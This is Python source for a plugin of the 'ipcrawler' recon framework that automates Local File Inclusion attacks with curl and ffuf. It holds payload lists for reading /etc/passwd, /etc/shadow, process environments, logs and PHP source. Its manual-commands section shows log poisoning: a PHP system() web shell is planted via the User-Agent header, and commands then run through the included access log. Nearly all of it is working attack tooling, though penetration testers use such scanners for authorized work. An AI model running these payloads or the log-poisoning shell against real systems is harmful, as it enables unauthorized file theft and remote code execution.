from ipcrawler.plugins import ServiceScan
from ipcrawler.config import config
import os
import asyncio
import re
import glob
from urllib.parse import urlparse, parse_qs, quote
import json


class CurlLFITest(ServiceScan):
    """
    Test for Local File Inclusion (LFI) vulnerabilities using curl.
    
    Features:
    - Smart endpoint discovery from directory busting results
    - Parameter extraction from discovered pages  
    - Comprehensive LFI payload testing
    - Fallback ffuf scanning when normal patterns fail
    - Integration with rich summary reporting
    """

    def __init__(self):
        super().__init__()
        self.name = "curl-lfi-test"
        self.tags = ["default", "web", "http", "lfi", "vulnerability"]
        self.priority = 3  # Run after directory busting

    def configure(self):
        # Common LFI payloads - Linux and Windows variants
        default_payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd", 
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../etc/shadow",
            "../../../etc/group",
            "../../../etc/hosts",
            "../../../proc/version",
            "../../../proc/self/environ",
            "../../../proc/self/status",
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
            "../../../../windows/win.ini",
            "../../../../windows/boot.ini",
            "../../../../windows/system32/drivers/etc/hosts",
            "../../../../boot.ini",
            "../../../../winnt/win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd", 
            "..././..././..././etc/passwd",
            "/etc/passwd%00",
            "../../../etc/passwd%00",
            "....//....//....//etc/passwd%00",
            "../../../../etc/httpd/conf/httpd.conf",
            "../../../../apache2/conf/httpd.conf",
            "../../../../var/log/httpd/access_log",
            "../../../var/log/httpd/access_log",
            "file:///etc/passwd",
            "file:///windows/win.ini",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../index.php",
            "php://filter/convert.base64-encode/resource=config.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        ]
        
        self.add_list_option(
            "payloads",
            default=default_payloads,
            help="LFI payloads to test. Default includes common Linux/Windows targets."
        )
        
        # Common parameter names used for file inclusion
        default_params = [
            "file", "filename", "path", "page", "include", "doc", "document", 
            "root", "filepath", "dir", "directory", "folder", "pg", "p", 
            "template", "view", "content", "cat", "action", "board", "date",
            "detail", "download", "prefix", "include", "inc", "locate", "show",
            "site", "type", "url", "goto", "path", "folder", "board", "file",
            "menu", "META-INF", "WEB-INF", "etc", "cmd", "exec", "execute",
            "img", "load", "retrieve", "read", "get", "open", "fetch", "ticket"
        ]
        
        self.add_list_option(
            "parameters",
            default=default_params,
            help="Parameter names to test for LFI vulnerabilities. Default includes common parameter names."
        )
        
        # Fallback endpoints if no directory discovery results
        default_endpoints = [
            "/", "/index.php", "/index.asp", "/index.aspx", "/index.jsp",
            "/download.php", "/view.php", "/read.php", "/get.php", "/file.php",
            "/include.php", "/content.php", "/page.php", "/document.php",
            "/show.php", "/display.php", "/download", "/admin/index.php"
        ]
        
        self.add_list_option(
            "fallback_endpoints",
            default=default_endpoints,
            help="Fallback endpoints to test if no directory discovery results found."
        )
        
        self.add_option(
            "timeout",
            default=10,
            help="Timeout for each curl request in seconds. Default: %(default)s"
        )
        
        self.add_option(
            "max_tests",
            default=100,
            help="Maximum number of LFI tests to run (increased from 50). Default: %(default)s"
        )
        
        self.add_true_option(
            "verbose_output",
            help="Include full response content in output files for analysis"
        )
        
        self.add_option(
            "smart_discovery",
            default=True,
            help="Enable smart endpoint and parameter discovery from other scan results. Default: %(default)s"
        )

        # Fallback ffuf scanning options
        self.add_option(
            "enable_ffuf_fallback",
            default=True,
            help="Enable fallback ffuf scanning when normal patterns fail to find vulnerabilities. Default: %(default)s"
        )
        
        self.add_option(
            "ffuf_max_params",
            default=100,
            help="Maximum number of parameters to test with ffuf fallback scanning. Default: %(default)s"
        )
        
        self.add_option(
            "ffuf_max_payloads", 
            default=200,
            help="Maximum number of payloads to test with ffuf fallback scanning. Default: %(default)s"
        )
        
        self.add_option(
            "ffuf_threads",
            default=20,
            help="Number of threads for ffuf fallback scanning. Default: %(default)s"
        )

        self.add_option(
            "user_agent",
            default="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
            help="User-Agent string to use. Default: %(default)s"
        )

        # Match HTTP services
        self.match_service_name("^http")
        self.match_service_name("^https")
        self.match_service_name("^nacn_http$", negative_match=True)
        self.match_service_name("^ssl/http")
        self.match_service_name("^tls/http")
        
        # Add patterns to detect LFI vulnerabilities
        self.add_pattern(r"root:.*:0:0:", "Linux passwd file detected")
        self.add_pattern(r"\[boot loader\]", "Windows boot.ini detected")
        self.add_pattern(r"\[fonts\]", "Windows win.ini detected")
        self.add_pattern(r"Linux version \d+\.\d+", "Linux kernel version detected")
        self.add_pattern(r"127\.0\.0\.1\s+localhost", "Hosts file detected")
        self.add_pattern(r"PATH_INFO", "Environment variables detected")
        self.add_pattern(r"LoadModule", "Apache config detected")
        self.add_pattern(r"<\?php", "PHP source code leaked")

    def discover_endpoints_from_directory_scans(self, service):
        """Discover actual endpoints from directory busting results"""
        discovered_endpoints = set()
        
        # Look for directory busting result files
        scan_dir = service.target.scandir
        
        # Common directory busting file patterns
        dirbuster_patterns = [
            f"{service.protocol}_{service.port}_{service.http_scheme}_feroxbuster*.txt",
            f"{service.protocol}_{service.port}_{service.http_scheme}_gobuster*.txt",
            f"{service.protocol}_{service.port}_{service.http_scheme}_dirsearch*.txt",
            f"{service.protocol}_{service.port}_{service.http_scheme}_dirb*.txt",
            f"{service.protocol}_{service.port}_{service.http_scheme}_ffuf*.txt"
        ]
        
        for pattern in dirbuster_patterns:
            files = glob.glob(os.path.join(scan_dir, pattern))
            for file_path in files:
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        endpoints = self.extract_endpoints_from_dirbuster_output(content)
                        discovered_endpoints.update(endpoints)
                        if endpoints:
                            service.info(f"📁 Discovered {len(endpoints)} endpoints from {os.path.basename(file_path)}")
                except Exception as e:
                    service.debug(f"Error reading {file_path}: {e}")
        
        return list(discovered_endpoints)

    def extract_endpoints_from_dirbuster_output(self, content):
        """Extract endpoints from directory busting tool output"""
        endpoints = set()
        
        # Patterns for different tools
        patterns = [
            # Feroxbuster: 200      GET       10l       20w      150c http://target.com/admin
            r"(?:200|301|302|403)\s+\w+\s+\d+l?\s+\d+w?\s+\d+c?\s+https?://[^/]+(/[^\s]*)",
            # Gobuster: /admin              (Status: 200) [Size: 150]
            r"(/[^\s]+)\s+\(Status:\s*(?:200|301|302|403)\)",
            # Dirsearch: 200 -  150B  - /admin
            r"(?:200|301|302|403)\s+-\s+\d+\w?\s+-\s+(/[^\s]+)",
            # Dirb: + http://target.com/admin (CODE:200|SIZE:150)
            r"\+\s+https?://[^/]+(/[^\s]+)\s+\(CODE:(?:200|301|302|403)",
            # ffuf: admin                     [Status: 200, Size: 150]
            r"^([^\s]+)\s+\[Status:\s*(?:200|301|302|403)",
            # Generic URL extraction
            r"https?://[^/]+(/[^\s]+)"
        ]
        
        lines = content.splitlines()
        for line in lines:
            line = line.strip()
            for pattern in patterns:
                matches = re.findall(pattern, line, re.IGNORECASE)
                for match in matches:
                    endpoint = match if isinstance(match, str) else match[0] if match else ""
                    if endpoint and endpoint.startswith('/'):
                        # Filter out very long endpoints and common static files
                        if len(endpoint) < 100 and not any(ext in endpoint.lower() for ext in ['.jpg', '.png', '.gif', '.css', '.js', '.ico', '.svg']):
                            endpoints.add(endpoint)
        
        return endpoints

    async def discover_parameters_from_pages(self, service, endpoints):
        """Discover actual parameters by analyzing discovered pages"""
        discovered_params = set()
        
        service.info("🔍 Analyzing discovered pages for parameters...")
        
        for endpoint in endpoints[:20]:  # Limit to first 20 endpoints to avoid too many requests
            try:
                # Fetch the page to analyze for parameters
                test_url = f"{service.http_scheme}://{service.target.addressv6}:{service.port}{endpoint}"
                curl_cmd = f'curl -s -k -m 10 "{test_url}"'
                
                result = await service.execute(curl_cmd, capture=True)
                if result and result.stdout:
                    params = self.extract_parameters_from_html(result.stdout)
                    discovered_params.update(params)
                    if params:
                        service.info(f"📋 Found parameters in {endpoint}: {', '.join(params)}")
                        
            except Exception as e:
                service.debug(f"Error analyzing {endpoint}: {e}")
                continue
            
            # Small delay
            await asyncio.sleep(0.2)
        
        return list(discovered_params)

    def extract_parameters_from_html(self, html_content):
        """Extract parameter names from HTML content"""
        parameters = set()
        
        # Look for form inputs
        input_patterns = [
            r'<input[^>]+name\s*=\s*["\']([^"\']+)["\']',
            r'<select[^>]+name\s*=\s*["\']([^"\']+)["\']',
            r'<textarea[^>]+name\s*=\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in input_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            parameters.update(matches)
        
        # Look for JavaScript parameter usage
        js_patterns = [
            r'(?:get|post|ajax).*[?&]([a-zA-Z_][a-zA-Z0-9_]*)\s*=',
            r'URLSearchParams.*[?&]([a-zA-Z_][a-zA-Z0-9_]*)',
            r'getParameter\s*\(\s*["\']([^"\']+)["\']',
            r'param\s*[:=]\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in js_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            parameters.update(matches)
        
        # Look for URL parameters in links
        url_patterns = [
            r'href\s*=\s*["\'][^"\']*[?&]([a-zA-Z_][a-zA-Z0-9_]*)\s*=',
            r'action\s*=\s*["\'][^"\']*[?&]([a-zA-Z_][a-zA-Z0-9_]*)\s*='
        ]
        
        for pattern in url_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            parameters.update(matches)
        
        # Filter out common non-parameter names
        filtered_params = []
        for param in parameters:
            if (len(param) > 1 and len(param) < 30 and 
                param.lower() not in ['submit', 'button', 'reset', 'csrf', 'token'] and
                not param.startswith('_')):
                filtered_params.append(param)
        
        return filtered_params

    async def run_ffuf_fallback_scan(self, service, base_url, output_file):
        """Run fallback ffuf scan when normal patterns fail"""
        service.info("🚀 Normal LFI patterns failed - Starting fallback ffuf scanning...")
        
        # Get wordlists from global config with local fallbacks
        param_wordlist = self.get_global("lfi-parameter-wordlist")
        payload_wordlist = self.get_global("lfi-payload-wordlist")
        
        # Use local wordlists as fallbacks if global ones don't exist
        wordlists_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "wordlists")
        local_param_wordlist = os.path.join(wordlists_dir, "lfi-parameters.txt")
        local_payload_wordlist = os.path.join(wordlists_dir, "lfi-payloads.txt")
        
        # Check and use parameter wordlist (global -> local -> skip)
        if not param_wordlist or not os.path.isfile(param_wordlist):
            if os.path.isfile(local_param_wordlist):
                param_wordlist = local_param_wordlist
                service.info(f"Using local LFI parameter wordlist: {local_param_wordlist}")
            else:
                service.warn("No LFI parameter wordlist found (global or local). Skipping ffuf parameter discovery.")
                service.info("To enable: configure 'lfi-parameter-wordlist' in global.toml or ensure local wordlist exists")
                return []
        
        # Check and use payload wordlist (global -> local -> skip)
        if not payload_wordlist or not os.path.isfile(payload_wordlist):
            if os.path.isfile(local_payload_wordlist):
                payload_wordlist = local_payload_wordlist
                service.info(f"Using local LFI payload wordlist: {local_payload_wordlist}")
            else:
                service.warn("No LFI payload wordlist found (global or local). Skipping ffuf payload testing.")
                service.info("To enable: configure 'lfi-payload-wordlist' in global.toml or ensure local wordlist exists")
                return []
        
        # Configuration options
        max_params = self.get_option("ffuf_max_params")
        max_payloads = self.get_option("ffuf_max_payloads")
        threads = self.get_option("ffuf_threads")
        timeout = self.get_option("timeout")
        
        findings = []
        
        # Step 1: Parameter discovery with ffuf
        service.info(f"🔍 Step 1: Discovering LFI parameters with ffuf...")
        param_results = await self.run_ffuf_parameter_discovery(service, base_url, param_wordlist, max_params, threads, timeout)
        
        if param_results:
            service.info(f"📋 Found {len(param_results)} potential LFI parameters")
            
            # Step 2: Test discovered parameters with LFI payloads
            service.info(f"🧪 Step 2: Testing discovered parameters with LFI payloads...")
            for param_result in param_results[:20]:  # Limit to top 20 results
                param_name = param_result.get('input', {}).get('FUZZ', '')
                if param_name:
                    lfi_findings = await self.test_parameter_with_lfi_payloads(
                        service, base_url, param_name, payload_wordlist, max_payloads, threads, timeout
                    )
                    findings.extend(lfi_findings)
        else:
            service.info("⚠️ No parameters discovered via ffuf parameter scanning")
        
        # Save fallback scan results
        if findings:
            service.info(f"🎯 Fallback ffuf scan found {len(findings)} LFI vulnerabilities!")
            with open(output_file, 'a') as f:
                f.write(f"\n\n========== FFUF FALLBACK SCAN RESULTS ==========\n")
                f.write(f"Found {len(findings)} LFI vulnerabilities via fallback ffuf scanning:\n\n")
                for finding in findings:
                    f.write(f"URL: {finding['url']}\n")
                    f.write(f"Parameter: {finding['parameter']}\n")
                    f.write(f"Payload: {finding['payload']}\n")
                    f.write(f"Response Size: {finding['size']}\n")
                    f.write(f"Status: {finding['status']}\n")
                    if finding.get('evidence'):
                        f.write(f"Evidence: {finding['evidence']}\n")
                    f.write("-" * 50 + "\n")
        else:
            service.info("❌ Fallback ffuf scan found no LFI vulnerabilities")
            
        return findings

    async def run_ffuf_parameter_discovery(self, service, base_url, param_wordlist, max_params, threads, timeout):
        """Run ffuf to discover potential LFI parameters"""
        results = []
        
        if not os.path.isfile(param_wordlist):
            service.warn(f"Parameter wordlist not found: {param_wordlist}")
            return results
        
        # Create temporary output file for ffuf results
        ffuf_output = f"{service.target.scandir}/ffuf_lfi_params_{service.port}.json"
        
        # Build ffuf command for parameter discovery
        # Test for error-based parameter discovery (look for different response sizes/status codes)
        ffuf_cmd = (
            f"ffuf -w {param_wordlist}:FUZZ "
            f"-u '{base_url}?FUZZ=../../../../etc/passwd' "
            f"-t {threads} "
            f"-timeout {timeout} "
            f"-s "  # Silent mode
            f"-o {ffuf_output} "
            f"-of json "
            f"-ac "  # Auto-calibrate (filter common response sizes automatically)
            f"-r "  # Follow redirects
            f"-H 'User-Agent: {self.get_option('user_agent')}'"
        )
        
        # Limit number of parameters to test
        if max_params > 0:
            ffuf_cmd += f" | head -n {max_params}"
        
        service.debug(f"Running ffuf parameter discovery: {ffuf_cmd}")
        
        try:
            result = await service.execute(ffuf_cmd, capture=True)
            
            # Parse ffuf JSON output
            if os.path.isfile(ffuf_output):
                with open(ffuf_output, 'r') as f:
                    ffuf_data = json.load(f)
                    results = ffuf_data.get('results', [])
                
                # Clean up temp file
                os.remove(ffuf_output)
                
        except Exception as e:
            service.debug(f"Error running ffuf parameter discovery: {e}")
        
        return results

    async def test_parameter_with_lfi_payloads(self, service, base_url, parameter, payload_wordlist, max_payloads, threads, timeout):
        """Test a specific parameter with LFI payloads using ffuf"""
        findings = []
        
        if not os.path.isfile(payload_wordlist):
            service.warn(f"Payload wordlist not found: {payload_wordlist}")
            return findings
        
        # Create temporary output file for ffuf results
        ffuf_output = f"{service.target.scandir}/ffuf_lfi_payloads_{service.port}_{parameter}.json"
        
        # Build ffuf command for payload testing
        ffuf_cmd = (
            f"ffuf -w {payload_wordlist}:FUZZ "
            f"-u '{base_url}?{parameter}=FUZZ' "
            f"-t {threads} "
            f"-timeout {timeout} "
            f"-s "  # Silent mode
            f"-o {ffuf_output} "
            f"-of json "
            f"-mc 200 "  # Match only 200 status codes
            f"-ms 1000-20000 "  # Match response sizes between 1KB-20KB (typical for file content)
            f"-r "  # Follow redirects
            f"-H 'User-Agent: {self.get_option('user_agent')}'"
        )
        
        # Limit number of payloads to test
        if max_payloads > 0:
            ffuf_cmd += f" | head -n {max_payloads}"
        
        service.debug(f"Running ffuf payload testing for parameter '{parameter}': {ffuf_cmd}")
        
        try:
            result = await service.execute(ffuf_cmd, capture=True)
            
            # Parse ffuf JSON output
            if os.path.isfile(ffuf_output):
                with open(ffuf_output, 'r') as f:
                    ffuf_data = json.load(f)
                    results = ffuf_data.get('results', [])
                
                # Analyze results for LFI evidence
                for ffuf_result in results:
                    # Get response content to check for LFI evidence
                    test_url = ffuf_result.get('url', '')
                    payload = ffuf_result.get('input', {}).get('FUZZ', '')
                    status = ffuf_result.get('status', 0)
                    size = ffuf_result.get('length', 0)
                    
                    if test_url and status == 200:
                        # Fetch response content to verify LFI
                        curl_cmd = f'curl -s -k -m {timeout} -H "User-Agent: {self.get_option("user_agent")}" "{test_url}"'
                        response_result = await service.execute(curl_cmd, capture=True)
                        
                        if response_result and response_result.stdout:
                            evidence = self.check_lfi_evidence(response_result.stdout)
                            if evidence:
                                findings.append({
                                    'url': test_url,
                                    'parameter': parameter,
                                    'payload': payload,
                                    'status': status,
                                    'size': size,
                                    'evidence': evidence,
                                    'method': 'FFUF_FALLBACK'
                                })
                
                # Clean up temp file
                os.remove(ffuf_output)
                
        except Exception as e:
            service.debug(f"Error testing parameter '{parameter}' with LFI payloads: {e}")
        
        return findings

    def check_lfi_evidence(self, response_content):
        """Check response content for LFI evidence patterns"""
        evidence_patterns = [
            (r"root:.*:0:0:", "Linux passwd file content"),
            (r"\[boot loader\]", "Windows boot.ini content"),
            (r"\[fonts\]", "Windows win.ini content"),
            (r"Linux version \d+\.\d+", "Linux kernel version"),
            (r"127\.0\.0\.1\s+localhost", "Hosts file content"),
            (r"PATH_INFO|HTTP_HOST|SERVER_NAME", "Environment variables"),
            (r"LoadModule|ServerRoot|DocumentRoot", "Apache configuration"),
            (r"<\?php|<?=", "PHP source code"),
            (r"mysql:|database:|password:", "Configuration file content")
        ]
        
        for pattern, description in evidence_patterns:
            if re.search(pattern, response_content, re.IGNORECASE):
                return description
        
        return None

    async def run(self, service):
        service.info("🔍 Starting LFI (Local File Inclusion) vulnerability testing...")
        service.debug(f"LFI plugin running against {service.target.address}:{service.port} ({service.name})")
        
        payloads = self.get_option("payloads")
        parameters = self.get_option("parameters")
        fallback_endpoints = self.get_option("fallback_endpoints")
        timeout = self.get_option("timeout")
        max_tests = self.get_option("max_tests")
        verbose = self.get_option("verbose_output")
        smart_discovery = self.get_option("smart_discovery")
        enable_ffuf_fallback = self.get_option("enable_ffuf_fallback")
        user_agent = self.get_option("user_agent")
        
        # Create output file for results
        output_file = f"{service.target.scandir}/{service.protocol}_{service.port}_{service.http_scheme}_lfi_test.txt"
        
        # Step 1: Discover actual endpoints from directory busting
        discovered_endpoints = []
        if smart_discovery:
            service.info("🕵️  Discovering endpoints from directory scan results...")
            discovered_endpoints = self.discover_endpoints_from_directory_scans(service)
            
            if discovered_endpoints:
                service.info(f"✅ Smart discovery found {len(discovered_endpoints)} endpoints")
                service.debug(f"Discovered endpoints: {discovered_endpoints[:10]}...")  # Show first 10
                
                # Step 2: Discover parameters from actual pages
                discovered_params = await self.discover_parameters_from_pages(service, discovered_endpoints)
                if discovered_params:
                    service.info(f"✅ Smart discovery found {len(discovered_params)} parameters")
                    service.debug(f"Discovered parameters: {discovered_params}")
                    # Add discovered parameters to our test list (prioritize them)
                    parameters = discovered_params + [p for p in parameters if p not in discovered_params]
            else:
                service.info("⚠️  No endpoints discovered from directory scans - using fallback endpoints")
                service.debug(f"Checked scan directory: {service.target.scandir}")
        else:
            service.info("🔧 Smart discovery disabled - using fallback endpoints only")
        
        # Use discovered endpoints or fallback to defaults
        test_endpoints = discovered_endpoints if discovered_endpoints else fallback_endpoints
        service.info(f"🎯 Testing {len(test_endpoints)} endpoints with {len(parameters)} parameters")
        service.debug(f"Endpoints to test: {test_endpoints[:10]}...")  # Show first 10 endpoints
        service.debug(f"Parameters to test: {parameters[:10]}...")  # Show first 10 parameters
        service.debug(f"Payloads available: {len(payloads)}")
        
        # Ensure we always test at least some basic combinations
        if not test_endpoints:
            test_endpoints = ["/", "/index.php"]
            service.warn("No endpoints found - using minimal fallback endpoints for testing")
        
        if not parameters:
            parameters = ["file", "page", "include", "path", "doc"]
            service.warn("No parameters configured - using minimal fallback parameters for testing")
        
        tests_run = 0
        vulnerabilities_found = 0
        results = []
        
        with open(output_file, 'w') as f:
            f.write("=== LFI Testing Results ===\n")
            f.write(f"Target: {service.target.addressv6}:{service.port}\n")
            f.write(f"Smart Discovery: {'Enabled' if smart_discovery else 'Disabled'}\n")
            f.write(f"Endpoints tested: {len(test_endpoints)}\n")
            f.write(f"Parameters tested: {len(parameters)}\n")
            f.write(f"Max tests: {max_tests}\n\n")
            
            # Test endpoints and parameters
            service.debug(f"🔄 Starting test loop: {len(test_endpoints)} endpoints × {len(parameters)} params × {len(payloads)} payloads = {len(test_endpoints) * len(parameters) * len(payloads)} potential tests (max: {max_tests})")
            for endpoint in test_endpoints:
                service.debug(f"🎯 Testing endpoint: {endpoint}")
                if tests_run >= max_tests:
                    service.debug(f"Max tests reached at endpoint {endpoint}: {tests_run}/{max_tests}")
                    break
                    
                for param in parameters:
                    service.debug(f"🔍 Testing parameter: {param}")
                    if tests_run >= max_tests:
                        service.debug(f"Max tests reached at parameter {param}: {tests_run}/{max_tests}")
                        break
                        
                    for payload in payloads:
                        service.debug(f"💣 Testing payload: {payload[:20]}...")
                        if tests_run >= max_tests:
                            service.debug(f"Max tests reached at payload: {tests_run}/{max_tests}")
                            break
                            
                        # Build test URL
                        base_url = f"{service.http_scheme}://{service.target.addressv6}:{service.port}{endpoint}"
                        test_url = f"{base_url}?{param}={quote(payload)}"
                        
                        # Execute curl request
                        curl_cmd = f'curl -s -k -m {timeout} -w "\\nHTTP_CODE:%{{http_code}}\\nSIZE:%{{size_download}}\\n" -H "User-Agent: {user_agent}" "{test_url}"'
                        
                        try:
                            # Increment test count before attempting execution
                            tests_run += 1
                            service.debug(f"Running LFI test {tests_run}/{max_tests}: {test_url}")
                            
                            result = await service.execute(curl_cmd, capture=True)
                            
                            if result and result.stdout:
                                service.debug(f"LFI test {tests_run} got response")
                            else:
                                service.debug(f"LFI test {tests_run} failed - no result or stdout")
                                continue
                                
                            if result and result.stdout:
                                # Parse response
                                response_lines = result.stdout.strip().split('\n')
                                status_code = "unknown"
                                response_size = "unknown"
                                response_content = ""
                                
                                for i, line in enumerate(response_lines):
                                    if line.startswith("HTTP_CODE:"):
                                        status_code = line.split(":", 1)[1]
                                    elif line.startswith("SIZE:"):
                                        response_size = line.split(":", 1)[1]
                                    else:
                                        response_content += line + "\n"
                                
                                # Check for LFI patterns in response
                                vulnerability_detected = False
                                for pattern_info in self.patterns:
                                    if isinstance(pattern_info, tuple) and len(pattern_info) == 2:
                                        pattern, description = pattern_info
                                    else:
                                        # Handle case where pattern_info might be a Pattern object
                                        pattern = pattern_info.pattern if hasattr(pattern_info, 'pattern') else str(pattern_info)
                                        description = "LFI pattern detected"
                                    
                                    if re.search(pattern, response_content):
                                        vulnerability_detected = True
                                        vulnerabilities_found += 1
                                        
                                        # Determine if this was smart discovery
                                        discovery_method = ""
                                        if endpoint in discovered_endpoints:
                                            discovery_method += "[DISCOVERED ENDPOINT] "
                                        if param in (await self.discover_parameters_from_pages(service, [endpoint]) if endpoint in discovered_endpoints else []):
                                            discovery_method += "[DISCOVERED PARAM] "
                                        
                                        result_entry = {
                                            "url": test_url,
                                            "endpoint": endpoint,
                                            "parameter": param,
                                            "payload": payload,
                                            "description": description,
                                            "status_code": status_code,
                                            "response_size": response_size,
                                            "discovery_method": discovery_method.strip(),
                                            "method": "NORMAL_SCAN"
                                        }
                                        results.append(result_entry)
                                        
                                        f.write(f"🚨 VULNERABILITY FOUND!\n")
                                        f.write(f"URL: {test_url}\n")
                                        f.write(f"Endpoint: {endpoint} {discovery_method}\n")
                                        f.write(f"Parameter: {param}\n")
                                        f.write(f"Payload: {payload}\n")
                                        f.write(f"Evidence: {description}\n")
                                        f.write(f"Status: {status_code}, Size: {response_size}\n")
                                        if verbose:
                                            f.write(f"Response:\n{response_content}\n")
                                        f.write("-" * 50 + "\n")
                                        
                                        service.info(f"🚨 LFI found: {endpoint}?{param}= - {description}")
                                        break
                                
                            # Small delay between requests
                            await asyncio.sleep(0.1)
                            
                        except Exception as e:
                            service.debug(f"Error testing {test_url}: {e}")
                            service.warn(f"LFI test failed for {endpoint}?{param}={payload}: {e}")
                            continue
        
        # Run fallback ffuf scan if no vulnerabilities found and ffuf fallback is enabled
        if vulnerabilities_found == 0 and enable_ffuf_fallback:
            try:
                base_url = f"{service.http_scheme}://{service.target.addressv6}:{service.port}"
                service.info("🔄 Attempting ffuf fallback scan for comprehensive LFI testing...")
                ffuf_findings = await self.run_ffuf_fallback_scan(service, base_url, output_file)
                if ffuf_findings:
                    vulnerabilities_found += len(ffuf_findings)
                    results.extend(ffuf_findings)
            except Exception as e:
                service.debug(f"Error running ffuf fallback scan: {e}")
                service.info("⚠️ Ffuf fallback scan failed - continuing with basic LFI scan results")
        
        # If still no tests were run, ensure we run at least some basic tests
        if tests_run == 0:
            service.warn("🚨 No LFI tests were executed! Running emergency basic tests...")
            service.debug(f"Emergency test trigger: test_endpoints={test_endpoints}, parameters={parameters}, payloads={len(payloads)}")
            emergency_endpoints = ["/"]
            emergency_params = ["file", "page"]
            emergency_payloads = ["../../../etc/passwd", "../../../../etc/passwd"]
            
            for endpoint in emergency_endpoints:
                for param in emergency_params:
                    for payload in emergency_payloads:
                        base_url = f"{service.http_scheme}://{service.target.addressv6}:{service.port}{endpoint}"
                        test_url = f"{base_url}?{param}={quote(payload)}"
                        
                        try:
                            tests_run += 1
                            curl_cmd = f'curl -s -k -m {timeout} -w "\\nHTTP_CODE:%{{http_code}}\\n" -H "User-Agent: {user_agent}" "{test_url}"'
                            result = await service.execute(curl_cmd, capture=True)
                            
                            if result and result.stdout and "root:" in result.stdout:
                                service.info(f"🚨 Emergency test found potential LFI: {test_url}")
                                vulnerabilities_found += 1
                                
                        except Exception as e:
                            service.debug(f"Emergency test error for {test_url}: {e}")
                            continue
            
            service.info(f"✅ Emergency basic tests completed: {tests_run} tests run")
        
        # Summary
        service.info(f"✅ LFI testing completed: {tests_run} tests run, {vulnerabilities_found} vulnerabilities found")
        
        with open(output_file, 'a') as f:
            f.write(f"\n=== SUMMARY ===\n")
            f.write(f"Tests run: {tests_run}\n")
            f.write(f"Vulnerabilities found: {vulnerabilities_found}\n")
            f.write(f"Smart discovery used: {'Yes' if discovered_endpoints else 'No'}\n")
            f.write(f"Fallback ffuf scan: {'Used' if enable_ffuf_fallback and vulnerabilities_found == 0 else 'Not needed'}\n")

    def manual(self, service, plugin_was_run):
        results = []
        
        if plugin_was_run:
            results.append("# LFI Testing completed - check output file for results")
            results.append("")
            
            # Manual testing suggestions
            results.append("# Manual LFI Testing Commands:")
            results.append("")
            
            base_url = f"{service.http_scheme}://{service.target.addressv6}:{service.port}"
            
            results.append("# Test common LFI parameters manually:")
            for param in ["file", "page", "include", "document", "path"]:
                results.append(f'curl -s -k "{base_url}/?{param}=../../../../etc/passwd"')
            
            results.append("")
            results.append("# Test with encoding bypasses:")
            results.append(f'curl -s -k "{base_url}/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"')
            results.append(f'curl -s -k "{base_url}/?file=....//....//....//etc/passwd"')
            
            results.append("")
            results.append("# Test PHP wrappers:")
            results.append(f'curl -s -k "{base_url}/?file=php://filter/convert.base64-encode/resource=index.php"')
            
            results.append("")
            results.append("# Test with null bytes (if PHP < 5.3):")
            results.append(f'curl -s -k "{base_url}/?file=../../../../etc/passwd%00"')
            
            results.append("")
            results.append("# Log poisoning attempt (if logs are accessible):")
            results.append(f'curl -s -k -A "<?php system($_GET[\'cmd\']); ?>" "{base_url}/"')
            results.append(f'curl -s -k "{base_url}/?file=../../../../var/log/apache2/access.log&cmd=id"')
            
        return results 